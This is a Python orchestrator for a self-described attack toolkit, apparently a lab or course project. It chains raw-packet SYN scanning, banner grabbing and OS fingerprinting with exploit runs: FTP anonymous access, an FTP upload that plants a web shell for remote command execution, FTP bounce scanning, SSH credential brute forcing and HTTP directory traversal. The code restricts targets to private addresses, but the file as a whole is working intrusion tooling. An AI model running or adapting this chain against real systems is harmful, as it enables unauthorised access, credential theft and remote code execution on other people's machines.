"""
Attack toolkit orchestrator.

Chains all phases of the reconnaissance + exploitation lifecycle:
    Phase 1: TCP SYN port scanning (raw packets via Npcap)
    Phase 2: Service banner grabbing (standard TCP sockets)
    Phase 3: OS fingerprinting (heuristic analysis of SYN/ACK features)
    Phase 4: OS-aware payload selection
    Phase 5: Exploit execution

Usage (from Administrator PowerShell):
    python attacker\\main.py ^
        --adapter "<NPCAP ADAPTER>" ^
        --target 192.168.1.25 ^
        --ports 21 80 443 445

    Optional flags:
        --skip-exploits     Run only scanning/fingerprinting
        --skip-banners      Skip banner grabbing phase
        --exploit-delay 2   Seconds between exploit attempts
"""

import sys
from pathlib import Path


for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):
        pass


sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import argparse
import ipaddress
import random
import time

from common.packet import (
    build_syn_frame, build_ecn_syn_frame, build_synfin_frame,
    build_icmp_echo_frame, build_udp_frame,
    parse_ipv4_tcp_frame, parse_ipv4_icmp_frame, parse_tcp_options,
    TCP_ACK, TCP_RST, TCP_SYN, IPPROTO_ICMP,
    STANDARD_SYN_OPTIONS,
)
from common.npcap import (
    Pcap, local_ipv4_for_target, local_mac_for_ip, arp_resolve
)
from fingerprint import fingerprint
from banner import grab_banners
from exploits import (
    ftp_anon, ftp_web_shell, ftp_bounce, ssh_bruteforce, http_traversal, os_payloads,
)


MAX_PROBES = 50
MIN_DELAY = 0.2

SEPARATOR = "═" * 65
SUB_SEP = "─" * 65


# ===========================================================================
# Phase 1 — SYN Port Scanning
# ===========================================================================

def phase1_scan(args, local_ip, src_mac, dst_mac):
    """Phase 1: TCP SYN port scanning."""
    print(f"\n{SEPARATOR}")
    print("  [PHASE 1] TCP SYN Port Scanning")
    print(SEPARATOR)
    print(f"  Target      : {args.target}")
    print(f"  Attacker IP : {local_ip}")
    print(f"  Attacker MAC: {src_mac}")
    print(f"  Target MAC  : {dst_mac}")
    print(f"  Ports       : {len(args.ports)}")
    print(f"  Delay       : {args.delay:.2f}s")
    print(SUB_SEP)

    rng = random.Random(args.seed)
    observations = []
    fingerprint_candidate = None

    with Pcap(args.adapter, snaplen=65535, promisc=True, timeout_ms=100) as cap:
        for index, port in enumerate(args.ports):
            src_port = args.source_port + index
            seq = rng.randrange(1, 0xFFFFFFFF)

            frame = build_syn_frame(
                src_mac, dst_mac,
                local_ip, args.target,
                src_port, port,
                seq,
                options=STANDARD_SYN_OPTIONS,
            )

            sent_at = time.monotonic()
            cap.send(frame)

            result = None
            state = "NO RESPONSE / POSSIBLY FILTERED"
            deadline = sent_at + args.timeout

            while time.monotonic() < deadline:
                raw = cap.recv()
                if raw is None:
                    continue

                recv_time = time.monotonic()
                info = parse_ipv4_tcp_frame(raw)
                if not info:
                    continue
                info["recv_time"] = recv_time

                if not (
                    info["src_ip"] == args.target
                    and info["dst_ip"] == local_ip
                    and info["src_port"] == port
                    and info["dst_port"] == src_port
                ):
                    continue

                flags = info["flags"]

                if (flags & TCP_SYN) and (flags & TCP_ACK):
                    state = "OPEN"
                    result = info
                    fingerprint_candidate = info
                    break

                if flags & TCP_RST:
                    state = "CLOSED"
                    result = info
                    if fingerprint_candidate is None or (
                        fingerprint_candidate.get("flags", 0) & TCP_RST
                    ):
                        fingerprint_candidate = info
                    break

            observations.append((port, state, result))

            if result:
                print(
                    f"  {port:5d}  {state:30s} "
                    f"TTL={result['ttl']:3d} "
                    f"WIN={result['window']}"
                )
            else:
                print(f"  {port:5d}  {state}")

            time.sleep(args.delay)

    ip_ids = [res["ip_id"] for _, _, res in observations
              if res and "ip_id" in res]
    if fingerprint_candidate:
        fingerprint_candidate["ip_ids"] = ip_ids

    ts_samples = []
    open_port_candidate = None
    closed_port_candidate = None
    for p, s, res in observations:
        if s == "OPEN" and open_port_candidate is None:
            open_port_candidate = p
        elif s == "CLOSED" and closed_port_candidate is None:
            closed_port_candidate = p
        if res and res.get("options"):
            opts = parse_tcp_options(res["options"])
            for opt in opts:
                if opt[0] == "TIMESTAMP":
                    ts_samples.append(
                        (res.get("recv_time", time.monotonic()), opt[1])
                    )

    # ECN probe
    ecn_info = {"tested": False}
    if open_port_candidate is not None:
        ecn_port = open_port_candidate
        ecn_src_port = random.randint(45000, 60000)
        time.sleep(0.4)
        with Pcap(args.adapter, snaplen=65535, promisc=True,
                  timeout_ms=100) as ecn_cap:
            ecn_seq = rng.randrange(1, 0xFFFFFFFF)
            ecn_frame = build_ecn_syn_frame(
                src_mac, dst_mac,
                local_ip, args.target,
                ecn_src_port, ecn_port, ecn_seq,
                options=STANDARD_SYN_OPTIONS,
            )
            e_sent = time.monotonic()
            ecn_cap.send(ecn_frame)
            e_deadline = e_sent + args.timeout
            ecn_responded = False
            while time.monotonic() < e_deadline:
                e_raw = ecn_cap.recv()
                if not e_raw:
                    continue
                e_recv_time = time.monotonic()
                e_info = parse_ipv4_tcp_frame(e_raw)
                if not e_info:
                    continue
                if (
                    e_info["src_ip"] == args.target
                    and e_info["dst_ip"] == local_ip
                    and e_info["src_port"] == ecn_port
                    and e_info["dst_port"] == ecn_src_port
                ):
                    ecn_responded = True
                    ecn_info = {
                        "tested": True,
                        "flags": e_info["flags"],
                        "ttl": e_info["ttl"],
                        "window": e_info["window"],
                        "dropped": False,
                    }
                    if "ip_id" in e_info:
                        ip_ids.append(e_info["ip_id"])
                    if e_info.get("options"):
                        for opt in parse_tcp_options(e_info["options"]):
                            if opt[0] == "TIMESTAMP":
                                ts_samples.append((e_recv_time, opt[1]))
                    break
            if not ecn_responded:
                ecn_info = {"tested": True, "dropped": True}
    else:
        ecn_info = {"tested": False,
                    "reason": "No open port for ECN negotiation"}

    # Invalid flags (SYN+FIN)
    invalid_flags_info = {"tested": False}
    if open_port_candidate is not None:
        inv_port = open_port_candidate
        inv_src_port = random.randint(45000, 60000)
        time.sleep(0.3)
        open_resp = False
        open_flags = None
        with Pcap(args.adapter, snaplen=65535, promisc=True,
                  timeout_ms=100) as inv_cap:
            inv_seq = rng.randrange(1, 0xFFFFFFFF)
            inv_frame = build_synfin_frame(
                src_mac, dst_mac,
                local_ip, args.target,
                inv_src_port, inv_port, inv_seq,
                options=STANDARD_SYN_OPTIONS,
            )
            i_sent = time.monotonic()
            inv_cap.send(inv_frame)
            i_deadline = i_sent + min(args.timeout, 1.5)
            while time.monotonic() < i_deadline:
                i_raw = inv_cap.recv()
                if not i_raw:
                    continue
                i_info = parse_ipv4_tcp_frame(i_raw)
                if not i_info:
                    continue
                if (
                    i_info["src_ip"] == args.target
                    and i_info["dst_ip"] == local_ip
                    and i_info["src_port"] == inv_port
                    and i_info["dst_port"] == inv_src_port
                ):
                    open_resp = True
                    open_flags = i_info["flags"]
                    if "ip_id" in i_info:
                        ip_ids.append(i_info["ip_id"])
                    break

        closed_resp = None
        if not open_resp and closed_port_candidate is not None:
            c_port = closed_port_candidate
            c_src_port = random.randint(45000, 60000)
            time.sleep(0.3)
            with Pcap(args.adapter, snaplen=65535, promisc=True,
                      timeout_ms=100) as c_cap:
                c_seq = rng.randrange(1, 0xFFFFFFFF)
                c_frame = build_synfin_frame(
                    src_mac, dst_mac,
                    local_ip, args.target,
                    c_src_port, c_port, c_seq,
                    options=STANDARD_SYN_OPTIONS,
                )
                c_sent = time.monotonic()
                c_cap.send(c_frame)
                c_deadline = c_sent + min(args.timeout, 1.2)
                closed_resp = False
                while time.monotonic() < c_deadline:
                    c_raw = c_cap.recv()
                    if not c_raw:
                        continue
                    c_info = parse_ipv4_tcp_frame(c_raw)
                    if not c_info:
                        continue
                    if (
                        c_info["src_ip"] == args.target
                        and c_info["dst_ip"] == local_ip
                        and c_info["src_port"] == c_port
                        and c_info["dst_port"] == c_src_port
                    ):
                        closed_resp = True
                        if "ip_id" in c_info:
                            ip_ids.append(c_info["ip_id"])
                        break

        invalid_flags_info = {
            "tested": True,
            "probe": "SYN+FIN",
            "open_port_responded": open_resp,
            "open_port_flags": open_flags,
            "closed_port_responded": closed_resp,
        }
    elif closed_port_candidate is not None:
        c_port = closed_port_candidate
        c_src_port = random.randint(45000, 60000)
        time.sleep(0.3)
        with Pcap(args.adapter, snaplen=65535, promisc=True,
                  timeout_ms=100) as c_cap:
            c_seq = rng.randrange(1, 0xFFFFFFFF)
            c_frame = build_synfin_frame(
                src_mac, dst_mac,
                local_ip, args.target,
                c_src_port, c_port, c_seq,
                options=STANDARD_SYN_OPTIONS,
            )
            c_sent = time.monotonic()
            c_cap.send(c_frame)
            c_deadline = c_sent + min(args.timeout, 1.2)
            closed_resp = False
            while time.monotonic() < c_deadline:
                c_raw = c_cap.recv()
                if not c_raw:
                    continue
                c_info = parse_ipv4_tcp_frame(c_raw)
                if not c_info:
                    continue
                if (
                    c_info["src_ip"] == args.target
                    and c_info["dst_ip"] == local_ip
                    and c_info["src_port"] == c_port
                    and c_info["dst_port"] == c_src_port
                ):
                    closed_resp = True
                    break
        invalid_flags_info = {
            "tested": True,
            "probe": "SYN+FIN",
            "open_port_responded": False,
            "open_port_flags": None,
            "closed_port_responded": closed_resp,
        }

    # Follow-up probe for timestamp clock
    if len(ts_samples) == 1 and open_port_candidate is not None:
        followup_port = open_port_candidate
        followup_src_port = random.randint(45000, 60000)
        time.sleep(0.4)
        with Pcap(args.adapter, snaplen=65535, promisc=True,
                  timeout_ms=100) as follow_cap:
            follow_seq = rng.randrange(1, 0xFFFFFFFF)
            follow_frame = build_syn_frame(
                src_mac, dst_mac,
                local_ip, args.target,
                followup_src_port, followup_port, follow_seq,
                options=STANDARD_SYN_OPTIONS,
            )
            f_sent = time.monotonic()
            follow_cap.send(follow_frame)
            f_deadline = f_sent + args.timeout
            while time.monotonic() < f_deadline:
                f_raw = follow_cap.recv()
                if not f_raw:
                    continue
                f_recv_time = time.monotonic()
                f_info = parse_ipv4_tcp_frame(f_raw)
                if not f_info:
                    continue
                if (
                    f_info["src_ip"] == args.target
                    and f_info["dst_ip"] == local_ip
                    and f_info["src_port"] == followup_port
                    and f_info["dst_port"] == followup_src_port
                ):
                    if "ip_id" in f_info:
                        ip_ids.append(f_info["ip_id"])
                    if f_info.get("options"):
                        for opt in parse_tcp_options(f_info["options"]):
                            if opt[0] == "TIMESTAMP":
                                ts_samples.append((f_recv_time, opt[1]))
                    break

    # ICMP + UDP battery
    icmp_resp = None
    time.sleep(0.3)
    with Pcap(args.adapter, snaplen=65535, promisc=True,
              timeout_ms=100) as icmp_cap:
        ie_id = rng.randrange(1, 0xFFFF)
        ie_frame = build_icmp_echo_frame(
            src_mac, dst_mac,
            local_ip, args.target,
            icmp_id=ie_id, icmp_seq=1, icmp_code=9,
            payload=b"A" * 64,
        )
        ie_sent = time.monotonic()
        icmp_cap.send(ie_frame)
        ie_deadline = ie_sent + min(args.timeout, 1.2)
        while time.monotonic() < ie_deadline:
            ie_raw = icmp_cap.recv()
            if not ie_raw:
                continue
            ie_info = parse_ipv4_icmp_frame(ie_raw)
            if not ie_info:
                continue
            if (
                ie_info["src_ip"] == args.target
                and ie_info["dst_ip"] == local_ip
                and ie_info["icmp_type"] == 0
            ):
                icmp_resp = ie_info
                break

    udp_resp = None
    time.sleep(0.3)
    with Pcap(args.adapter, snaplen=65535, promisc=True,
              timeout_ms=100) as udp_cap:
        u_src_port = random.randint(45000, 60000)
        u_frame = build_udp_frame(
            src_mac, dst_mac,
            local_ip, args.target,
            src_port=u_src_port, dst_port=33434,
            payload=b"C" * 300,
        )
        u_sent = time.monotonic()
        udp_cap.send(u_frame)
        u_deadline = u_sent + min(args.timeout, 1.2)
        while time.monotonic() < u_deadline:
            u_raw = udp_cap.recv()
            if not u_raw:
                continue
            u_info = parse_ipv4_icmp_frame(u_raw)
            if not u_info:
                continue
            if (
                u_info["src_ip"] == args.target
                and u_info["dst_ip"] == local_ip
                and u_info["icmp_type"] == 3
            ):
                udp_resp = u_info
                break

    icmp_udp_info = {
        "tested": True,
        "echo_responded": icmp_resp is not None,
        "echo_code": icmp_resp["icmp_code"] if icmp_resp else None,
        "echo_ttl": icmp_resp["ttl"] if icmp_resp else None,
        "echo_df": icmp_resp["df"] if icmp_resp else None,
        "echo_ip_id": icmp_resp["ip_id"] if icmp_resp else None,
        "udp_responded": udp_resp is not None,
        "udp_icmp_type": udp_resp["icmp_type"] if udp_resp else None,
        "udp_icmp_code": udp_resp["icmp_code"] if udp_resp else None,
        "udp_ttl": udp_resp["ttl"] if udp_resp else None,
        "udp_quoted_len": udp_resp["quoted_length"] if udp_resp else None,
    }

    if (fingerprint_candidate is None
            or getattr(args, "prefer_icmp", False)) and icmp_resp is not None:
        fingerprint_candidate = {
            "ttl": icmp_resp["ttl"],
            "window": 0,
            "options": b"",
            "df": icmp_resp["df"],
            "ip_id": icmp_resp["ip_id"],
            "flags": 0,
            "probe_type": "ICMP Echo Reply",
            "protocol": IPPROTO_ICMP,
        }

    if fingerprint_candidate:
        fingerprint_candidate["ip_ids"] = ip_ids
        fingerprint_candidate["ts_samples"] = ts_samples
        fingerprint_candidate["ecn_info"] = ecn_info
        fingerprint_candidate["invalid_flags_info"] = invalid_flags_info
        fingerprint_candidate["icmp_udp_info"] = icmp_udp_info

    return observations, fingerprint_candidate


# ===========================================================================
# Phase 2 — Banner Grabbing
# ===========================================================================

def phase2_banners(args, open_ports):
    print(f"\n{SEPARATOR}")
    print("  [PHASE 2] Service Banner Grabbing")
    print(SEPARATOR)

    if not open_ports:
        print("  No open ports found — skipping banner grabbing.")
        return []

    results = grab_banners(args.target, open_ports, timeout=5.0)

    for r in results:
        status = "✓" if r["success"] else "✗"
        print(f"  {status} {r['port']:5d}  "
              f"{r['service']:8s} → {r['version'][:60]}")

    return results


# ===========================================================================
# Phase 3 — OS Fingerprinting
# ===========================================================================

def phase3_fingerprint(fingerprint_candidate, banner_results=None):
    print(f"\n{SEPARATOR}")
    print("  [PHASE 3] OS Fingerprinting")
    print(SEPARATOR)

    if not fingerprint_candidate:
        print("  No SYN/ACK or RST observed — fingerprint unavailable.")
        return None

    fp = fingerprint(fingerprint_candidate, banners=banner_results)
    probe_type = fingerprint_candidate.get("probe_type") or (
        "Closed-Port TCP RST" if (fingerprint_candidate.get("flags", 0) & TCP_RST)
        else "Open-Port TCP SYN/ACK"
    )

    print(f"  Candidate  : {probe_type}")
    print(f"  Likely OS  : {fp['os']}")
    print(f"  Confidence : {fp['confidence']}%")
    print(f"  Version    : {fp['version']}")
    if fp.get("version_tiers"):
        for tier, pct in fp["version_tiers"]:
            print(f"               {pct:3d}%  {tier}")
    print(f"  TTL        : {fp['ttl']} (initial {fp['initial_ttl']}, "
          f"~{fp['hops']} hop(s))")
    print(f"  Window     : {fp['window']}")
    print(f"  DF bit     : {'set' if fp['df'] else 'clear'}")
    if fp.get("ip_id_sequence") and len(fp["ip_id_sequence"]) > 1:
        print(f"  IP ID Seq  : {fp['ip_id_sequence']} "
              f"(deltas: {fp.get('ip_id_deltas', [])})")
        print(f"  IP ID Class: {fp.get('ip_id_class', 'UNKNOWN')}")
    elif fp.get("ip_id") is not None:
        print(f"  IP ID      : {fp['ip_id']}")
    print(f"  Options    : "
          f"{', '.join(str(x) for x in fp['options']) or 'none'}")
    if fp.get("banner_evidence"):
        print(f"  Cross-Layer: {len(fp['banner_evidence'])} banner signature(s)")
    print(f"  Probability:")
    for cls, pct in fp["distribution"]:
        bar = "#" * (pct // 5)
        print(f"    {cls:16s} {pct:3d}%  {bar}")
    print(f"  Evidence   :")
    for reason in fp["reasons"]:
        print(f"    - {reason}")

    return fp


# ===========================================================================
# Phase 5 — Exploit Execution (with OS-aware selection)
# ===========================================================================

def phase5_exploits(args, open_ports, banner_results, os_family="Unknown"):
    print(f"\n{SEPARATOR}")
    print("  [PHASE 4] OS-Aware Payload Selection")
    print(SEPARATOR)
    print(f"  Target OS family: {os_family}")
    cfg = os_payloads.get_config(os_family)
    print(f"  Traversal targets: "
          f"{[d for _, d in cfg['traversal_targets']]}")
    print(f"  RCE command      : {cfg['rce_command']}")

    print(f"\n{SEPARATOR}")
    print("  [PHASE 5] Exploit Execution")
    print(SEPARATOR)

    banner_map = {b["port"]: b for b in banner_results}
    exploit_results = []

    # --- Exploit 1: FTP anonymous read (baseline) ---
    if 21 in open_ports:
        print(f"\n  {SUB_SEP}")
        print(f"  [EXPLOIT 1] FTP Anonymous Login (port 21)")
        print(f"  {SUB_SEP}")
        r = ftp_anon.run(
            args.target, port=21, banner_info=banner_map.get(21)
        )
        exploit_results.append(r)
        print(f"  Status  : {'SUCCESS ✓' if r['success'] else 'FAILED ✗'}")
        print(f"  Detail  : {r['detail']}")
        if r["success"] and r.get("files"):
            for f in r["files"][:8]:
                print(f"    {f}")
        time.sleep(args.exploit_delay)

    # --- Exploit 2: FTP write -> web shell -> RCE ---
    if 21 in open_ports and (80 in open_ports or 8080 in open_ports):
        print(f"\n  {SUB_SEP}")
        print(f"  [EXPLOIT 2] FTP Write → Web Shell → RCE "
              f"(ports 21 + HTTP)")
        print(f"  {SUB_SEP}")
        http_port = 80 if 80 in open_ports else 8080
        r = ftp_web_shell.run(
            args.target, port=21, http_port=http_port,
            banner_info=banner_map.get(21),
            os_family=os_family, cleanup=True,
        )
        exploit_results.append(r)
        print(f"  Status  : {'SUCCESS ✓' if r['success'] else 'FAILED ✗'}")
        print(f"  Detail  : {r['detail']}")
        for stage, info in r["stages"].items():
            mark = "✓" if info.get("success") else "✗"
            print(f"    {mark} {stage}: {info.get('detail', '')}")
        if r["rce_output"]:
            print(f"  RCE output:")
            for line in r["rce_output"].splitlines()[:12]:
                print(f"    {line}")
        time.sleep(args.exploit_delay)

    # --- Exploit 3: FTP bounce ---
    if 21 in open_ports:
        print(f"\n  {SUB_SEP}")
        print(f"  [EXPLOIT 3] FTP Bounce Attack (port 21)")
        print(f"  {SUB_SEP}")
        bounce_port = 80 if 80 in open_ports else 445
        r = ftp_bounce.run(
            args.target, port=21,
            bounce_target=args.target,
            bounce_port=bounce_port,
            scan_ports=[80, 443, 445, 3389],
            banner_info=banner_map.get(21),
        )
        exploit_results.append(r)
        print(f"  Status  : {'SUCCESS ✓' if r['success'] else 'FAILED ✗'}")
        print(f"  Detail  : {r['detail']}")
        for probe in r["probes"]:
            print(f"    {probe['target']}:{probe['port']} -> "
                  f"{probe['outcome']}")
        time.sleep(args.exploit_delay)

    # --- Exploit: SSH Weak Credentials ---
    if 22 in open_ports:
        print(f"\n  {SUB_SEP}")
        print(f"  [EXPLOIT] SSH Weak Credentials (port 22)")
        print(f"  {SUB_SEP}")
        ssh_result = ssh_bruteforce.run(
            args.target, port=22, banner_info=banner_map.get(22),
            delay=1.0, mode=getattr(args, "ssh_mode", "loud"),
        )
        exploit_results.append(ssh_result)
        status = "SUCCESS ✓" if ssh_result["success"] else "FAILED ✗"
        print(f"  Status   : {status}")
        print(f"  Detail   : {ssh_result['detail']}")
        print(f"  Attempts : {ssh_result['attempts']}")
        if ssh_result["success"] and ssh_result.get("command_output"):
            print(f"  Commands :")
            for cmd, output in ssh_result["command_output"].items():
                print(f"    {cmd} → {output[:80]}")
        time.sleep(args.exploit_delay)

    # --- Exploit 4: HTTP traversal (OS-aware) ---
    http_ports = [p for p in open_ports if p in (80, 8080, 8443)]
    for http_port in http_ports:
        print(f"\n  {SUB_SEP}")
        print(f"  [EXPLOIT 4] HTTP Directory Traversal (port {http_port})")
        print(f"  {SUB_SEP}")
        r = http_traversal.run(
            args.target, port=http_port,
            banner_info=banner_map.get(http_port),
            os_family=os_family,
        )
        exploit_results.append(r)
        print(f"  Status   : {'SUCCESS ✓' if r['success'] else 'FAILED ✗'}")
        print(f"  Detail   : {r['detail']}")
        for p in r["successful_payloads"]:
            print(f"  Payload : {p['payload']}")
            print(f"  Preview : {p['body_preview'][:120]}...")
        time.sleep(args.exploit_delay)

    if not exploit_results:
        print("\n  No applicable exploits for the discovered open ports.")

    return exploit_results


# ===========================================================================
# Summary
# ===========================================================================

def print_summary(observations, banner_results, fp_result, exploit_results):
    print(f"\n\n{SEPARATOR}")
    print("  ATTACK SUMMARY")
    print(SEPARATOR)

    open_count = sum(1 for _, s, _ in observations if s == "OPEN")
    closed_count = sum(1 for _, s, _ in observations if s == "CLOSED")
    filtered_count = sum(
        1 for _, s, _ in observations
        if "FILTERED" in s or "NO RESPONSE" in s
    )
    print(f"  Ports scanned : {len(observations)}")
    print(f"  Open          : {open_count}")
    print(f"  Closed        : {closed_count}")
    print(f"  Filtered/NR   : {filtered_count}")

    banner_success = sum(1 for b in banner_results if b["success"])
    print(f"  Banners found : {banner_success}/{len(banner_results)}")

    if fp_result:
        print(f"  OS guess      : {fp_result['os']} "
              f"({fp_result['confidence']}%)")

    if exploit_results:
        success_count = sum(1 for e in exploit_results if e["success"])
        print(f"  Exploits      : {success_count}/"
              f"{len(exploit_results)} successful")
        for e in exploit_results:
            marker = "✓" if e["success"] else "✗"
            print(f"    {marker} {e['name']} (port {e['port']})")

    print(SEPARATOR)


# ===========================================================================
# Entry point
# ===========================================================================

def main():
    p = argparse.ArgumentParser(
        description=(
            "Custom port scanner + OS fingerprinter + exploit toolkit. "
            "Demonstrates the full reconnaissance → exploitation chain."
        )
    )

    p.add_argument("--adapter", required=True,
                   help="Exact Npcap adapter name")
    p.add_argument("--target", required=True,
                   help="One explicitly authorized private IPv4 target")
    p.add_argument("--ports", required=True, nargs="+", type=int,
                   help="Ports to scan (max 50)")
    p.add_argument("--timeout", type=float, default=1.5,
                   help="Per-port SYN timeout in seconds (default: 1.5)")
    p.add_argument("--delay", type=float, default=0.5,
                   help="Delay between SYN probes in seconds (default: 0.5)")
    p.add_argument("--source-port", type=int, default=40000,
                   help="Starting source port for probes (default: 40000)")
    p.add_argument("--seed", type=int, default=406,
                   help="RNG seed for sequence numbers (default: 406)")
    p.add_argument("--skip-banners", action="store_true",
                    help="Skip banner grabbing phase")
    p.add_argument("--skip-exploits", action="store_true",
                    help="Skip exploit execution phase")
    p.add_argument("--exploit-delay", type=float, default=1.0,
                    help="Delay between exploit attempts (default: 1.0)")
    p.add_argument("--prefer-icmp", action="store_true",
                    help="Force using ICMP Echo Reply as primary fingerprint candidate (demo/firewall test)")
    p.add_argument("--ssh-mode", choices=["quiet", "stealth", "loud", "full"], default="loud",
                    help="SSH attack mode: 'quiet'/'stealth' (recon only) or 'loud'/'full' (payloads + voice)")

    args = p.parse_args()

    target_ip = ipaddress.ip_address(args.target)
    if target_ip.version != 4 or not target_ip.is_private:
        raise SystemExit(
            "Safety limit: target must be a private IPv4 address."
        )
    if len(args.ports) > MAX_PROBES:
        raise SystemExit(f"Safety limit: at most {MAX_PROBES} ports per run.")
    if args.source_port + len(args.ports) - 1 > 65535:
        raise SystemExit("Source port range exceeds 65535.")
    if args.delay < MIN_DELAY:
        raise SystemExit(f"Safety limit: --delay must be >= {MIN_DELAY}s.")
    if any(not 1 <= x <= 65535 for x in args.ports):
        p.error("Every port must be between 1 and 65535.")
    if not 0.1 <= args.timeout <= 10:
        p.error("--timeout must be between 0.1 and 10 seconds.")

    local_ip = local_ipv4_for_target(args.target)
    src_mac = local_mac_for_ip(local_ip)
    dst_mac = arp_resolve(args.target, local_ip)

    print(SEPARATOR)
    print("  CUSTOM PORT SCANNER — ATTACK TOOLKIT")
    print(SEPARATOR)
    print(f"  Target       : {args.target}")
    print(f"  Attacker     : {local_ip} ({src_mac})")
    print(f"  Target MAC   : {dst_mac}")
    print(f"  Ports        : {args.ports}")
    print(f"  Scan delay   : {args.delay}s")

    observations, fp_candidate = phase1_scan(args, local_ip, src_mac, dst_mac)
    open_ports = [port for port, state, _ in observations if state == "OPEN"]

    banner_results = []
    if not args.skip_banners and open_ports:
        banner_results = phase2_banners(args, open_ports)
    elif args.skip_banners:
        print(f"\n  [PHASE 2] Banner grabbing skipped (--skip-banners)")

    fp_result = phase3_fingerprint(fp_candidate, banner_results)

    # Extract OS family for OS-aware exploitation
    os_family = "Unknown"
    if fp_result:
        os_family = os_payloads.from_fingerprint(fp_result)

    exploit_results = []
    if not args.skip_exploits and open_ports:
        exploit_results = phase5_exploits(
            args, open_ports, banner_results, os_family=os_family
        )
    elif args.skip_exploits:
        print(f"\n  [PHASE 5] Exploit execution skipped (--skip-exploits)")

    print_summary(observations, banner_results, fp_result, exploit_results)


if __name__ == "__main__":
    main()